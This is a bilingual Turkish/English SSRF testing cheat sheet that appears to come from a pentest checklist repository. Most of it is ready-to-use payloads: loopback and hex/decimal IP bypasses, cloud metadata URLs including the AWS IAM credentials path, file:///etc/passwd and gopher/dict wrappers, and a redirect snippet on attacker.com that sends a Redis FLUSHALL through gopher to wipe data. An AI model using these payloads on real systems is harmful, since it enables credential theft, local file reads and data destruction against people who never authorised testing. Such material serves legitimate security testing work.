# 🔄 Server-Side Request Forgery (SSRF)

## 🇹🇷 Türkçe

### Kontrol Listesi

| # | Test | Açıklama | Durum |
|---|------|----------|-------|
| 1 | Localhost Access | `127.0.0.1` veya `localhost` erişimi | ⬜ |
| 2 | Internal Network | İç ağ taraması (192.168.x.x, 10.x.x.x) | ⬜ |
| 3 | Cloud Metadata | AWS/GCP/Azure metadata servisi | ⬜ |
| 4 | Protocol Smuggling | `gopher://`, `dict://`, `file://` | ⬜ |
| 5 | Blind SSRF | Dış sunucuya ping atıyor mu? | ⬜ |

### Temel Payloadlar

```
http://localhost
http://127.0.0.1
http://[::1]
http://2130706433/ (Decimal IP)
http://0x7f000001/ (Hex IP)
http://localtest.me
```

### Cloud Metadata (En Kritik!)

**AWS:**
```
http://169.254.169.254/latest/meta-data/
http://169.254.169.254/latest/meta-data/iam/security-credentials/
```

**GCP:**
```
http://metadata.google.internal/computeMetadata/v1/
(Header: Metadata-Flavor: Google)
```

**Azure:**
```
http://169.254.169.254/metadata/instance
(Header: Metadata: true)
```

### Protocol Wrappers

```
file:///etc/passwd
dict://127.0.0.1:6379/ (Redis)
gopher://127.0.0.1:25/ (SMTP)
ldap://localhost:389
```

### Komutlar

```bash
# Interactsh veya Burp Collaborator kullan
# Payload: http://[YOUR_COLLABORATOR_ID]

# Redirect testi
# Kendi sunucunda redirect.php oluştur:
# <?php header("Location: gopher://localhost:6379/_FLUSHALL"); ?>
# Hedefe gönder: http://target.com/?url=http://attacker.com/redirect.php
```

---

## 🇬🇧 English

### Checklist

| # | Test | Description | Status |
|---|------|-------------|--------|
| 1 | Localhost Access | Access loopback interface | ⬜ |
| 2 | Internal Network | Scan internal subnets | ⬜ |
| 3 | Cloud Metadata | Dump cloud credentials | ⬜ |
| 4 | Protocol Smuggling | Use alternate protocols | ⬜ |
| 5 | Blind SSRF | Check out-of-band interaction | ⬜ |

### Cloud Metadata Targets

```
# AWS
http://169.254.169.254/latest/meta-data/

# Kubernetes
http://169.254.169.254/
```

### Tips

1.  **Bypass Filters:** Use decimal/hex IPs, DNS rebinding, redirects.
2.  **Impact:** Port scanning, reading local files, cloud takeover.

---

[← Back to README](../README.md)
